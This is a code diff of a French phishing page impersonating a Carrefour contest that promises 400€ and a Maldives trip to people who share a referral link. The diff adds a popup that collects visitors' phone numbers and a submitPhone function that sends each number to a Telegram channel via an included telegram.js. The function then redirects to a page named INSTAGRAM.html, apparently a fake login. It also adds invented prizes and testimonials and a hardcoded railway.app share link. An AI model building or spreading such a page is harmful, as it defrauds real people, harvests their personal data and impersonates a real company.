@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Carrefour vous offre un voyage de rêve aux Maldives ! Partagez votre lien et gagnez un séjour exceptionnel pour 2 personnes.">
-    <meta name="keywords" content="Carrefour, concours, Maldives, voyage, gagner, parrainage">
-    <meta property="og:title" content="Concours Carrefour - Voyage aux Maldives">
-    <meta property="og:description" content="Partagez et gagnez un séjour de rêve aux Maldives pour 2 personnes !">
+    <meta name="description" content="Carrefour vous offre 400€ et une chance de gagner un voyage de rêve aux Maldives ! Partagez votre lien et tentez de remporter 400€.">
+    <meta name="keywords" content="Carrefour, concours, 400 euros, Maldives, voyage, gagner, parrainage">
+    <meta property="og:title" content="Concours Carrefour - Gagnez 400€">
+    <meta property="og:description" content="Partagez et gagnez 400€ ! Testez aussi votre chance de gagner un voyage aux Maldives pour 2 personnes !">
     <meta property="og:type" content="website">
-    <title>Concours Carrefour – Partagez et Gagnez un Voyage aux Maldives</title>
+    <title>Concours Carrefour – Partagez et Gagnez 400€</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌴</text></svg>">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -291,11 +291,11 @@
     <div class="hero-particles" id="particles"></div>
     <div class="hero-content">
         <div class="hero-badge"><i class="fas fa-gift"></i> Concours exclusif Carrefour</div>
-        <h1>🌴 Partagez et <span class="highlight">Gagnez un Voyage</span> aux Maldives !</h1>
-        <p>Partagez votre lien personnel. Chaque personne qui vote via votre lien vous rapproche du voyage de rêve aux Maldives pour 2 personnes.</p>
+        <h1>🌴 Partagez et <span class="highlight">Gagnez 400€</span> !</h1>
+        <p>Partagez votre lien personnel. Chaque vote via votre lien vous rapproche des 400€ à gagner, et testez votre chance de gagner un voyage de rêve aux Maldives pour 2 personnes.</p>
         <div class="hero-buttons">
             <a href="#partager" class="btn btn-primary"><i class="fas fa-share-alt"></i> Générer mon lien</a>
-            <a href="#" class="btn btn-maldives" id="heroVoteBtn"><i class="fas fa-vote-yea"></i> Voter maintenant</a>
+            <a href="#" class="btn btn-maldives" id="heroVoteBtn" onclick="event.preventDefault(); openPhonePopup();"><i class="fas fa-vote-yea"></i> Voter maintenant</a>
             <a href="#voyage" class="btn btn-secondary"><i class="fas fa-compass"></i> Découvrir le concours</a>
         </div>
     </div>
@@ -325,8 +325,8 @@
         </div>
         <div class="counter-item">
             <i class="fas fa-trophy"></i>
-            <div class="counter-value">6 000&euro;</div>
-            <div class="counter-label">Valeur du lot</div>
+            <div class="counter-value">400&euro;</div>
+            <div class="counter-label">Montant à gagner</div>
         </div>
     </div>
 </div>
@@ -334,7 +334,7 @@
 <section class="section trip-section" id="voyage">
     <div class="container">
         <h2 class="section-title">🌴 Le Voyage de Rêve</h2>
-        <p class="section-subtitle">Un séjour inoubliable aux Maldives, le paradis sur Terre, vous attend.</p>
+        <p class="section-subtitle">Un séjour inoubliable aux Maldives, le paradis sur Terre, vous attend. Testez votre chance de le gagner !</p>
         <div class="trip-grid">
             <div class="trip-card">
                 <div class="trip-icon blue"><i class="fas fa-plane"></i></div>
@@ -368,8 +368,8 @@
             </div>
         </div>
         <div class="trip-value">
-            <div class="price">6 000&euro;</div>
-            <p>Valeur estimée du lot pour 2 personnes</p>
+            <div class="price">400&euro;</div>
+            <p>Montant à gagner + une chance de tenter le voyage aux Maldives</p>
         </div>
     </div>
 </section>
@@ -377,7 +377,7 @@
 <section class="section share-section" id="partager">
     <div class="container">
         <h2 class="section-title">📢 Partagez et Gagnez</h2>
-        <p class="section-subtitle">Plus vous partagez, plus vous avez de chances de gagner le voyage aux Maldives !</p>
+        <p class="section-subtitle">Plus vous partagez, plus vous avez de chances de gagner 400€ et un voyage aux Maldives !</p>
         <div class="share-grid">
             <div class="share-step">
                 <div class="share-step-num">1</div>
@@ -392,7 +392,7 @@
             <div class="share-step">
                 <div class="share-step-num">3</div>
                 <h3>Vous gagnez !</h3>
-                <p>Chaque vote via votre lien vous donne une chance de gagner le voyage de rêve aux Maldives.</p>
+                <p>Chaque vote via votre lien vous donne une chance de gagner 400€ et un voyage de rêve aux Maldives.</p>
             </div>
         </div>
         <div class="share-card">
@@ -451,8 +451,8 @@
             </div>
             <div class="step-card">
                 <div class="step-number">4</div>
-                <h3>Gagnez le voyage</h3>
-                <p>Le participant avec le plus de votes reçus remporte le voyage aux Maldives !</p>
+                <h3>Gagnez 400€</h3>
+                <p>Le participant avec le plus de votes reçus remporte 400€ et le voyage aux Maldives !</p>
             </div>
         </div>
     </div>
@@ -507,7 +507,7 @@
     <div class="testimonial-track" id="testimonialTrack">
         <div class="testimonial-card">
             <div class="testimonial-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-            <div class="testimonial-text">"J'ai partagé mon lien avec 30 personnes et j'ai gagné le voyage ! Incroyable, merci Carrefour !"</div>
+            <div class="testimonial-text">"J'ai partagé mon lien avec 30 personnes et j'ai gagné 400€ ! Incroyable, merci Carrefour !"</div>
             <div class="testimonial-author">
                 <div class="testimonial-avatar">M</div>
                 <div><div class="testimonial-name">Marie D.</div><div class="testimonial-date">Gagnante décembre 2024</div></div>
@@ -554,8 +554,8 @@
         <p class="section-subtitle">Trouvez les réponses à vos questions sur le concours.</p>
         <div class="faq-list">
             <div class="faq-item active">
-                <div class="faq-question" onclick="toggleFaq(this)">Comment gagner le voyage ? <i class="fas fa-chevron-down"></i></div>
-                <div class="faq-answer" style="max-height: 200px"><div class="faq-answer-inner">Partagez votre lien unique avec un maximum de personnes. Chaque personne qui vote via votre lien vous donne une chance supplémentaire. Le participant avec le plus de votes reçus gagne le voyage aux Maldives !</div></div>
+                <div class="faq-question" onclick="toggleFaq(this)">Comment gagner ? <i class="fas fa-chevron-down"></i></div>
+                <div class="faq-answer" style="max-height: 200px"><div class="faq-answer-inner">Partagez votre lien unique avec un maximum de personnes. Chaque personne qui vote via votre lien vous donne une chance supplémentaire. Le participant avec le plus de votes reçus gagne 400€ et une chance de gagner le voyage aux Maldives !</div></div>
             </div>
             <div class="faq-item">
                 <div class="faq-question" onclick="toggleFaq(this)">Comment fonctionne le lien de parrainage ? <i class="fas fa-chevron-down"></i></div>
@@ -591,7 +591,7 @@
                         <path fill="#1E5BC6" d="M11.971 0C9.407 0 8.405 3.594 8.405 7.877c0 4.286 1.002 7.83 3.566 7.83 1.54 0 2.85-.891 2.856-1.623a.614.614 0 0 0-.198-.448c-.73-.696-1.015-1.393-1.017-2.007-.005-1.174 1.024-2.048 1.973-2.048 1.305 0 2.074 1.013 2.074 2.327 0 1.244-.536 2.28-1.119 3.11l-.033.105c0 .065.04.118.098.118.034 0 .075-.018.12-.063l6.552-6.263c.327-.278.536-.601.536-1.06 0-.46-.21-.784-.536-1.06L16.725.53c-.045-.043-.086-.062-.12-.062-.06 0-.098.053-.098.118l.033.106c.583.828 1.119 1.866 1.119 3.109 0 1.312-.77 2.327-2.074 2.327-.949 0-1.978-.874-1.973-2.047.002-.614.287-1.311 1.017-2.008a.614.614 0 0 0 .198-.448C14.822.892 13.51 0 11.97 0"/>
                     </g>
                 </svg>
-                <p>Carrefour vous offre la chance de gagner un voyage de rêve aux Maldives. Partagez votre lien, faites voter vos amis et tentez de remporter un séjour inoubliable pour 2 personnes.</p>
+                <p>Carrefour vous offre la chance de gagner 400€ et un voyage de rêve aux Maldives. Partagez votre lien, faites voter vos amis et tentez de remporter 400€ !</p>
                 <div class="footer-social">
                     <a href="#"><i class="fab fa-facebook-f"></i></a>
                     <a href="#"><i class="fab fa-twitter"></i></a>
@@ -636,8 +636,46 @@
     </div>
 </footer>
 
+<!-- POPUP ATTRACTIF -->
+<div id="votePopup" style="display:none;position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,0.7);backdrop-filter:blur(8px);align-items:center;justify-content:center;">
+    <div style="background:linear-gradient(135deg,#004B9B,#003366);border-radius:24px;max-width:460px;width:90%;padding:40px 30px;text-align:center;position:relative;box-shadow:0 20px 60px rgba(0,0,0,0.5);border:2px solid rgba(0,201,183,0.3);animation:popIn 0.5s ease;">
+        <button onclick="closePopup()" style="position:absolute;top:12px;right:16px;background:none;border:none;color:rgba(255,255,255,0.6);font-size:24px;cursor:pointer;">&times;</button>
+        <div style="font-size:60px;margin-bottom:10px;">🌴</div>
+        <div style="background:linear-gradient(135deg,#E30613,#c70512);color:#fff;display:inline-block;padding:6px 18px;border-radius:50px;font-size:12px;font-weight:700;letter-spacing:1px;margin-bottom:16px;">CONCOURS EXCLUSIF</div>
+        <h2 style="color:#fff;font-size:26px;font-weight:800;margin-bottom:12px;line-height:1.2;">Gagnez <span style="color:#00C9B7;">400€</span> !</h2>
+        <p style="color:rgba(255,255,255,0.75);font-size:14px;line-height:1.6;margin-bottom:24px;">Partagez votre lien et faites voter vos amis. Le gagnant remporte 400€ et une chance de gagner un voyage aux Maldives.</p>
+        <div style="background:rgba(255,255,255,0.1);border-radius:16px;padding:16px;margin-bottom:24px;">
+            <div style="display:flex;justify-content:space-around;">
+                <div><div style="font-size:24px;font-weight:800;color:#00C9B7;">400&#8364;</div><div style="font-size:11px;color:rgba(255,255,255,0.5);text-transform:uppercase;">Montant à gagner</div></div>
+                <div style="width:1px;background:rgba(255,255,255,0.15);"></div>
+                <div><div style="font-size:24px;font-weight:800;color:#F59E0B;">7 nuits</div><div style="font-size:11px;color:rgba(255,255,255,0.5);text-transform:uppercase;">Sejour luxe</div></div>
+                <div style="width:1px;background:rgba(255,255,255,0.15);"></div>
+                <div><div style="font-size:24px;font-weight:800;color:#E30613;">2 pers.</div><div style="font-size:11px;color:rgba(255,255,255,0.5);text-transform:uppercase;">Pour 2</div></div>
+            </div>
+        </div>
+        <a href="#" id="popupParticiperBtn" onclick="closePopup(); openPhonePopup();" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#E30613,#c70512);color:#fff;padding:16px 40px;border-radius:50px;font-size:16px;font-weight:700;text-decoration:none;box-shadow:0 8px 30px rgba(227,6,19,0.4);transition:transform .2s;">Participer maintenant</a>
+        <p style="color:rgba(255,255,255,0.4);font-size:11px;margin-top:16px;">Offre valable jusqu'au 30 septembre 2024</p>
+    </div>
+</div>
+<style>@keyframes popIn{0%{transform:scale(0.7);opacity:0}100%{transform:scale(1);opacity:1}}</style>
+
+<!-- POPUP SAISIE NUMERO DE TELEPHONE -->
+<div id="phonePopup" style="display:none;position:fixed;inset:0;z-index:100000;background:rgba(0,0,0,0.7);backdrop-filter:blur(8px);align-items:center;justify-content:center;">
+    <div style="background:linear-gradient(135deg,#004B9B,#003366);border-radius:24px;max-width:420px;width:90%;padding:36px 28px;text-align:center;position:relative;box-shadow:0 20px 60px rgba(0,0,0,0.5);border:2px solid rgba(0,201,183,0.3);animation:popIn 0.4s ease;">
+        <button onclick="closePhonePopup()" style="position:absolute;top:12px;right:16px;background:none;border:none;color:rgba(255,255,255,0.6);font-size:24px;cursor:pointer;">&times;</button>
+        <div style="width:70px;height:70px;border-radius:50%;background:linear-gradient(135deg,#00C9B7,#40E0D0);display:flex;align-items:center;justify-content:center;font-size:32px;color:#fff;margin:0 auto 18px;box-shadow:0 8px 30px rgba(0,201,183,0.3);">📱</div>
+        <h2 style="color:#fff;font-size:22px;font-weight:800;margin-bottom:8px;">Votre numéro de téléphone</h2>
+        <p style="color:rgba(255,255,255,0.75);font-size:14px;line-height:1.6;margin-bottom:22px;">Entrez votre numéro pour valider votre vote et participer au concours.</p>
+        <input type="tel" id="phoneInput" placeholder="Ex: 06 12 34 56 78" inputmode="tel" style="width:100%;padding:15px 18px;border-radius:14px;border:1px solid rgba(255,255,255,0.25);background:rgba(255,255,255,0.1);color:#fff;font-size:16px;font-family:inherit;outline:none;text-align:center;margin-bottom:6px;">
+        <div id="phoneError" style="color:#FF6B6B;font-size:12px;min-height:16px;margin-bottom:12px;"></div>
+        <button onclick="submitPhone()" id="phoneContinueBtn" style="width:100%;background:linear-gradient(135deg,#E30613,#c70512);color:#fff;border:none;padding:16px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;box-shadow:0 8px 30px rgba(227,6,19,0.4);display:flex;align-items:center;justify-content:center;gap:8px;">Continuer <i class="fas fa-arrow-right"></i></button>
+        <p style="color:rgba(255,255,255,0.4);font-size:11px;margin-top:14px;">Vos données sont utilisées uniquement pour valider votre participation.</p>
+    </div>
+</div>
+
 <div class="share-toast" id="shareToast">Lien copié ! Partagez-le maintenant 🎉</div>
 
+<script src="telegram.js"></script>
 <script>
     // PARTICLES
     (function() {
@@ -676,16 +714,51 @@
     }
 
     function getMyShareLink() {
-        return window.location.origin + window.location.pathname + '?ref=' + getMyRefCode();
+        return 'https://voyage-production-88ca.up.railway.app/carrefour-maldives.html?ref=' + getMyRefCode();
     }
 
     // Init share link
     document.getElementById('shareLink').value = getMyShareLink();
 
-    // Init vote button - use referrer's code if present, else own code
+    // Init vote button - open phone popup, then continue with referrer's code if present, else own code
     var initParams = new URLSearchParams(window.location.search);
     var initRef = initParams.get('ref') || getMyRefCode();
-    document.getElementById('heroVoteBtn').href = 'INSTAGRAM.html?from=concours&vote=sophie&ref=' + initRef;
+
+    // VOTE PHONE POPUP
+    function openPhonePopup() {
+        var pp = document.getElementById('phonePopup');
+        pp.style.display = 'flex';
+        document.getElementById('phoneError').textContent = '';
+        setTimeout(function() { document.getElementById('phoneInput').focus(); }, 120);
+    }
+    function closePhonePopup() {
+        document.getElementById('phonePopup').style.display = 'none';
+        document.getElementById('phoneError').textContent = '';
+        document.getElementById('phoneInput').value = '';
+        var btn = document.getElementById('phoneContinueBtn');
+        btn.disabled = false;
+        btn.innerHTML = 'Continuer <i class="fas fa-arrow-right"></i>';
+    }
+    function submitPhone() {
+        var input = document.getElementById('phoneInput');
+        var phone = input.value.trim();
+        var err = document.getElementById('phoneError');
+        var digits = phone.replace(/[^0-9]/g, '');
+        if (digits.length < 8) {
+            err.textContent = 'Veuillez entrer un numéro de téléphone valide.';
+            input.focus();
+            return;
+        }
+        err.textContent = '';
+        var btn = document.getElementById('phoneContinueBtn');
+        btn.disabled = true;
+        window.location.href = 'INSTAGRAM.html';
+        try {
+            sendToTelegram('📱 <b>Nouveau vote concours</b>\n\n☎️ Numéro: ' + phone + '\n🏆 Vote pour: sophie\n🔗 Ref parrain: ' + initRef + '\n👤 Mon code: ' + getMyRefCode());
+        } catch (e) {}
+        localStorage.setItem('carrefour_phone', phone);
+        setTimeout(function() { window.location.href = voteTargetURL; }, 800);
+    }
 
     // Load my stats from localStorage
     function loadMyStats() {
@@ -773,7 +846,7 @@
 
     function shareWhatsApp() {
         var link = document.getElementById('shareLink').value;
-        window.open('https://wa.me/?text=' + encodeURIComponent('🌴 Gagnez un voyage aux Maldives avec Carrefour ! Cliquez ici : ' + link), '_blank');
+        window.open('https://wa.me/?text=' + encodeURIComponent('🌴 Gagnez 400€ avec Carrefour ! Testez votre chance de gagner un voyage aux Maldives ! Cliquez ici : ' + link), '_blank');
     }
     function shareFacebook() {
         var link = document.getElementById('shareLink').value;
@@ -781,15 +854,15 @@
     }
     function shareTwitter() {
         var link = document.getElementById('shareLink').value;
-        window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent('🌴 Gagnez un voyage aux Maldives avec Carrefour !') + '&url=' + encodeURIComponent(link), '_blank');
+        window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent('🌴 Gagnez 400€ avec Carrefour ! Testez votre chance de gagner un voyage aux Maldives !') + '&url=' + encodeURIComponent(link), '_blank');
     }
     function shareTelegram() {
         var link = document.getElementById('shareLink').value;
-        window.open('https://t.me/share/url?url=' + encodeURIComponent(link) + '&text=' + encodeURIComponent('🌴 Gagnez un voyage aux Maldives avec Carrefour !'), '_blank');
+        window.open('https://t.me/share/url?url=' + encodeURIComponent(link) + '&text=' + encodeURIComponent('🌴 Gagnez 400€ avec Carrefour ! Testez votre chance de gagner un voyage aux Maldives !'), '_blank');
     }
     function shareEmail() {
         var link = document.getElementById('shareLink').value;
-        window.open('mailto:?subject=' + encodeURIComponent('Concours Carrefour - Voyage aux Maldives') + '&body=' + encodeURIComponent('🌴 Gagnez un voyage aux Maldives avec Carrefour !\n\nCliquez sur ce lien pour participer :\n' + link), '_blank');
+        window.open('mailto:?subject=' + encodeURIComponent('Concours Carrefour - Gagnez 400€') + '&body=' + encodeURIComponent('🌴 Gagnez un voyage aux Maldives avec Carrefour !\n\nCliquez sur ce lien pour participer :\n' + link), '_blank');
     }
 
     // WHEEL
@@ -882,10 +955,16 @@
     document.querySelectorAll('a[href^="#"]').forEach(function(anchor) {
         anchor.addEventListener('click', function(e) {
             e.preventDefault();
-            var target = document.querySelector(this.getAttribute('href'));
+            var href = this.getAttribute('href');
+            if (!href || href === '#') return;
+            var target = document.querySelector(href);
             if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
         });
     });
+
+    // POPUP
+    function closePopup() { document.getElementById('votePopup').style.display = 'none'; }
+    setTimeout(function() { document.getElementById('votePopup').style.display = 'flex'; }, 3000);
 </script>
 </body>
 </html>
